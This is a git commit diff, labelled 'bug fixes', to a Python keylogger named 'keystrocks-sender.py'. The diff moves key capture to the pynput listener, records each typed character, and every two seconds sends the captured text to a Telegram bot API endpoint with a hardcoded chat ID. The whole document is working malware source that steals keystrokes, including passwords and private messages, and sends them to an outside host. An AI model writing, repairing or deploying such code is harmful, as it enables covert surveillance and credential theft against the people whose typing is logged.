d41805cd8ddfc6afe8470a55341cbb2f4bcb7527
tech-haxz <ranktopno1@gmail.com>
2024-07-10 13:49:22 +0530

    bug fixes

--- keystrocks-sender.py
+++ keystrocks-sender.py
@@ -1,5 +1,5 @@
-import time
-import keyboard
+from pynput import keyboard
+# import keyboard
 import threading
 import requests
 
@@ -17,7 +17,7 @@ try:
     def on_key_press(event):
         global data
         try:
-            data += event.name
+            data += event.char
         except:
             pass
 
@@ -25,15 +25,16 @@ try:
         global data
         requests.get(f"https://api.telegram.org/bot{Token_api}/sendMessage?chat_id=1579016671&text={data}")
         data = ''
-        threading.Timer(5, send_logs).start()
+        threading.Timer(2, send_logs).start()
 
-    keyboard.on_press(on_key_press)
-    keyboard.wait()
+    # keyboard.on_press(on_key_press)
+    # keyboard.wait()
 
+    listener = keyboard.Listener(on_press=on_key_press)
+    with listener:
+        send_logs()
+        listener.join()
     
 
 except KeyboardInterrupt:
     print('Exiting...')
-
-
-
